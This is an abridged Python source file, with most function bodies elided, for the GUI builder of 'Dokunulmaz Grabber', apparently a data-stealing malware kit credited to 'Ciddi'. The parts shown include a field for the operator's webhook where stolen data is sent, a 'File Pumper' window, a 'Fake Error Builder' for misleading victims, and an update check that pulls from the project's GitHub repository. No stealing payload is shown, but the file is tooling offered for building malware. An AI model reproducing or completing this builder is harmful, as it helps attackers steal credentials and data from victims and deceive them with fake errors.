Coded By Ciddi social media:guns.lol/ciddi
		...
		if Settings.UpdatesCheck:
			...
			if os.path.isfile(hashFilePath):
				...
				try:
					...
					newhash = json.loads(http.request("GET", "https://raw.githubusercontent.com/dokunulmaz/dokunulmaz-grabber/main/Dokunulmaz%20Grabber/Extras/hash", timeout= 5).data.decode())["hash"]
...
class BuilderOptionsFrame(ctk.CTkFrame):
	...
	def __init__(self, master) -> None:
		...
		self.C2EntryControl = ctk.CTkEntry(self, placeholder_text= "Enter Your Webhook Here", height= 38, font= self.font, text_color= "white")
...
class PumperSettings(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		...
		self.title("Dokunulmaz Grabber[File Pumper]")
		self.after(200, lambda: self.iconbitmap(os.path.join("İcon", "icon.ico")))
		self.grab_set()
...
class FakeErrorBuilder(ctk.CTkToplevel):
	...
	def __init__(self, master) -> None:
		super().__init__(master)
		self.title("Dokunulmaz Grabber [Fake Error Builder]")
		self.after(200, lambda: self.iconbitmap(os.path.join("İcon", "icon.ico")))
		self.grab_set()
...
class Builder(ctk.CTk):
	...
	def __init__(self) -> None:
		...
		self.title("Dokunulmaz Grabber [Builder]")
		self.iconbitmap(os.path.join("İcon", "icon.ico"))
		...
		self.titleLabel = ctk.CTkLabel(self, text= "Dokunulmaz Grabber", font= ctk.CTkFont(size= 68, weight= "bold"), text_color= "#2F58CD")
...
if __name__ == "__main__":
	...
	if os.name == "nt":
		...
		if Utility.CheckForUpdates():
			...
			if response:
				webbrowser.open_new_tab("https://github.com/dokunulmaz/dokunulmaz-grabber")
				exit(0)
